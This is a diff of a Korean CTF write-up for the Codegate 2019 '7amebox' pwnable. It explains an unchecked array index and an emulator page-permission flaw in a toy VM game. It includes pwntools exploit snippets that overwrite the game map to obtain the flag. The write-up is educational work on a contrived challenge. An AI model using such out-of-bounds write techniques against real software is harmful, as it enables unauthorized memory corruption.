@@ -4,11 +4,12 @@ date = "2024-07-29"
 description = "Codegate CTF 2019 pwnable challenge"
 
 [taxonomies]
-tags = ["ctf", "pwnable", "vm", "out of bound"]
+tags = ["ctf", "pwnable", "vm", "improper check", "out of bound"]
 +++
 
 ## 0x00. Introduction
 기본적인 구조는 [7amebox-name](../Codegate-CTF-2019-Quals-7amebox-name/)과 동일하다.
+
 ``` bash
 ➜  ls -al
 total 64
@@ -60,8 +61,8 @@ z             = boss monster (flag)
                             ...                              
 ##############################################################
 ```
-`stage.map` 파일을 읽어 메모리에 로드한 후 `w`, `a`, `s`, `d`를 통해 움직이다가 `monster`를  잡으면 생성되는 `*`을 획득해서 `power up`을 한다.
 
+`stage.map` 파일을 읽어 메모리에 로드한 후 `w`, `a`, `s`, `d`를 통해 움직이다가 monster를  잡으면 생성되는 `*`을 획득해서 power up을 한다.
 이 외에도 취약점 트리거를 위한 `buy_dug`, `sell_dog` 메뉴가 있다.
 
 ### Goal
@@ -84,12 +85,15 @@ _0x534_boss:
     ...
 }
 ```
-`stage.map`에 있는 `z`를 만날 경우 보스 스테이지가 열리고, `hp`는 사실상 관계 없이 `power`만 `0x2bc`보다 크거나 같으면 flag를 출력해준다.
 
-하지만 `map`에 있는 모든 `monster`를 잡아도 `power` 값을 `0x2bc`보다 크게 만들 수 없기 때문에 exploit 방향을 `map`의 정보를 조작하는 것으로 잡았다.
+`stage.map`에 있는 `z`를 만날 경우 boss 스테이지가 열리고, `hp`는 사실상 관계 없이 `power`만 `0x2bc`보다 크거나 같으면 flag를 출력해준다.
+
+하지만 `map`에 있는 모든 monster를 잡아도 `power` 값을 `0x2bc`보다 크게 만들 수 없기 때문에 exploit 방향을 `map`의 정보를 조작하는 것으로 잡았다.
+
 
 ## 0x01. Vulnerability
 Firmware 실행 후 처음 실행되는 `load_map_0x103()` 함수에서 다음과 같은 전역변수 초기화가 이루어진다.
+
 ``` c
 int load_map_0x103() {
     int new_page;   // 0xf5fc5
@@ -111,7 +115,9 @@ int load_map_0x103() {
     return new_page;
 }
 ```
+
 이 중 `dog_avatar_0x1003`은 다음과 같이 활용된다.
+
 ``` c
 void buy_dog_0x25c() {
     int choice;
@@ -142,9 +148,7 @@ _0x2fe:
 `syscall`을 통해서 메모리 할당이 성공하면 `dog_count_0x1000`이 증가하고 해당 index에 할당된 메모리 영역 주소를 쓴다.
 
 그런데 `dog_count_0x1000`의 boundary check를 하지 않기 때문에 값이 `0x101`이 될 경우 `dog_avatar_0x1003` 배열 뒤에 있는 `map_0x1303`에 값을 쓸 수 있게 된다.
-
 `map_0x1303`에는 `stage.map`의 내용을 읽어 저장한 메모리 주소가 담겨있기 때문에 이를 조작할 경우 `map` 정보를 조작할 수 있다.
-
 게다가 `avatar`를 그린다는 명목으로 할당받은 메모리에 값을 `0x1000`만큼 쓸 수 있어서 `map`의 내용도 마음대로 조작할 수 있다.
 
 ``` bash
@@ -161,7 +165,9 @@ do you want to draw a avatar of the dog? (y/n)
 [*] allocating 0xfc-th page
 you already have too many dogs!
 ```
+
 문제는 `0xfb`번만 할당이 되고 실패했는데 이유를 확인해보니,
+
 ``` bash
 gef > mmap
 0x0     : r-x
@@ -170,7 +176,9 @@ gef > mmap
 0xf4000 : rw-
 0xf5000 : rw-
 ```
+
 이미 할당되어있는 page가 있고 emulator에서 `0x0` ~ `0xff000`영역만 할당 가능한 영역으로 저장하기 때문이었다.
+
 ``` python
 class Memory:
     def __init__(self, size):
@@ -185,7 +193,9 @@ class EMU:
         self.memory     = Memory(2 ** 20)   # 0x100000
         ...
 ```
+
 따라서 index 역할을 하는 `dog_count_0x1000` 값을 `0xfb`에서 `0x101`까지 다른 취약점을 이용해서 증가시켜야하는데, `sell_count_0x1306` 값이 딱 그 차이인 `0x6`이므로 `sell_dog_0x304()`를 활용해야 한다는 합리적인 추론을 해볼 수 있다.
+
 ``` c
 void sell_dog_0x304() {
     int choice;     // 0xf5fc5
@@ -207,7 +217,9 @@ _0x37d:
     return;
 }
 ```
-하지만 `sell_dog_0x304()`의 코드를 보면 unmapping할 주소가 `0x100000`보다 작으면 `syscall`을 호출할 수 없는데, 동적 분석을 할 때 `AAAA`를 입력했는데 unmapping이 성공한 기억이 있어 emulator 코드를 확인해보았다.
+
+하지만 `sell_dog_0x304()`의 코드를 보면 unmapping할 주소가 `0x100000`보다 작으면 `syscall`을 호출할 수 없다. 그런데 동적 분석을 할 때 `AAAA`를 입력했더니 unmapping이 성공한 기억이 있어 emulator 코드를 확인해보았다.
+
 ``` python
 class EMU:
     ...
@@ -221,18 +233,18 @@ class Memory:
         self.pages[addr & 0b111111111000000000000] = perm & 0b1111
     ...
 ```
-Emulator에서 `sys_s6()`이 호출되면 `Memory` 객체의 `set_perm()` 함수를 통해 page의 권한을 `0b0000`으로 만들어버린다.
 
+Emulator에서 `sys_s6()`이 호출되면 `Memory` 객체의 `set_perm()` 함수를 통해 page의 권한을 `0b0000`으로 만들어버린다.
 그런데 이 과정에서 해당 page가 존재하는지 확인하지 않고 권한을 입력하는데, python의 dictionary에서 존재하지 않는 key에 값을 입력하면 key-value 쌍을 생성해서 저장한다.
 
 따라서 존재하지 않는 영역인 `AAAA` 영역도 unmapping이 가능했고, 이 영역이 `pages` dictionary에 저장되므로 할당도 가능하다.
-
 물론 할당 이후 값을 쓰거나 읽으려고 하면 memory size를 넘어가므로 에러가 난다.
-
 하지만 `dog_count_0x1000`를 증가시키는 것이 목적이므로 `munmap` -> `map`을 6번 수행하고 `write`가 가능한 영역에 `map` 정보를 쓰면 된다.
+
 
 ## 0x02. Exploit
 Emulator가 메모리를 할당해주는 과정은 다음과 같다.
+
 ``` python
     def allocate(self, new_perm, addr=None):
         if addr:
@@ -248,13 +260,13 @@ Emulator가 메모리를 할당해주는 과정은 다음과 같다.
                 return page
         return -1
 ```
+
 이렇게 `addr`이 정해지지 않았을 때, `pages` dictionary를 순회하며 `PERM_MAPPED` 권한이 없는 `page`를 return해준다.
 
 python 2.7에서는 dictionary를 순회할 때 랜덤한 순서로 순회하는데다, 값을 이후에 추가한다고 하더라도 순서가 맨 뒤에 오는 것이 아니라 중간에 낄 수도 있다.
+
 ``` python
-Python 2.7.18 (default, Oct 15 2023, 16:43:11) 
-[GCC 11.4.0] on linux2
-Type "help", "copyright", "credits" or "license" for more information.
+# Python 2.7.18
 >>> a = {"A" : 1, "B" : 2, "C" : 3, "D" : 4}
 >>> for key in a:
 ...     print key,
@@ -266,9 +278,10 @@ A C B D
 ... 
 A C B E D
 ```
-따라서 `Memory` 객체의 `pages` dictionary에 key-value 값을 추가한다면 높은 확률로 중간에 key가 삽입될 것이다.
 
+따라서 `Memory` 객체의 `pages` dictionary에 key-value 값을 추가한다면 높은 확률로 중간에 key가 삽입될 것이다.
 실제로 emulator가 `pages` dictionary를 생성하고 unmapping을 하는 과정을 따라해보면 다음과 같은 결과를 얻을 수 있다.
+
 ``` python
 >>> pages = {}
 >>> for page in range(0, 2 ** 20, 0x1000):                      # Memory.__init__()
@@ -283,34 +296,38 @@ page 0x100000 is at 98-th index
 >>> print "last page %s is at %d-th index" % (hex(page), index)
 last page 0x78000 is at 256-th index
 ```
+
 따라서 마지막 `page`인 `0x78000` 영역을 남겨놓고 모든 영역을 할당하기 위해 다음과 같이 payload를 구성했다.
+
 ``` python
     for i in range(0xfa):
         log.info(f"buying : {hex(i + 1)} / 0xfa")
         buy_dog(s, b"n")
 ```
+
 이러면 `dog_count_0x1000`는 `0xfa`까지 증가했을 것이고, `sell_dog_0x304()`를 이용하여 `0x6`만큼 더 증가시키는 방식은 다음과 같다.
+
 ``` python
     for i in range(6):
         log.info(f"selling and buying : {hex(i + 1)} / 0x6")
         sell_dog(s, 0x100000)
         buy_dog(s, b"n")
 ```
+
 마지막으로 남은 `0x78000` 메모리를 할당받으면 마침내 `dog_count_0x1000`는 `0x101`이 되면서 `map_0x1303`이 `0x78000`으로 덮이게 된다.
 
-이제 `avatar`를 그리기 위해 입력하는 값이 그대로 `map` 정보가 되므로, 나의 위치와 `boss`를 제외한 `map`을 모두 `power up`을 의미하는 `*`으로 채워넣기 위한 payload는 다음과 같다.
+이제 `avatar`를 그리기 위해 입력하는 값이 그대로 `map` 정보가 되므로, 나의 위치와 boss를 제외한 `map`을 모두 power up을 의미하는 `*`으로 채워넣기 위한 payload는 다음과 같다.
+
 ``` python
     payload = b"@"
     payload += b"*" * 3598
     payload += b"z"
     buy_dog(s, b"y", payload)
 ```
-이제 남은 것은 충분히 `power`를 늘려서 `boss`와 싸우는 것인데, `boss`를 이기기 위한 조건은 `power`가 0x2bc보다 크거나 같은 것이고 `power up`을 하면 `power`가 `0x5`만큼 증가하므로, 최소 121번의 `power up`이 필요하다
-``` python
->>> (0x2bc - 0x61) / 0x5
-120.6
-```
+
+이제 남은 것은 충분히 `power`를 늘려서 boss와 싸우는 것인데, boss를 이기기 위한 조건은 `power`가 0x2bc보다 크거나 같은 것이고 power up을 하면 `power`가 `0x5`만큼 증가하므로, 최소 121번의 power up이 필요하다
 현재 `map`의 모든 자리가 `*`으로 채워져있으므로 어디로든 121번 전에 이동한 적이 없는 곳으로 이동하면 된다.
+
 ``` python
     for i in range(2):
         for j in range(60):
@@ -322,6 +339,7 @@ last page 0x78000 is at 256-th index
     move(s, b"w")
     move(s, b"a")
 ```
+
 
 ## 0x03. Payload
 ``` python
@@ -406,6 +424,7 @@ def main():
 if __name__=='__main__':
     main()
 ```
+
 
 ## 0x04. Decompile
 ``` c
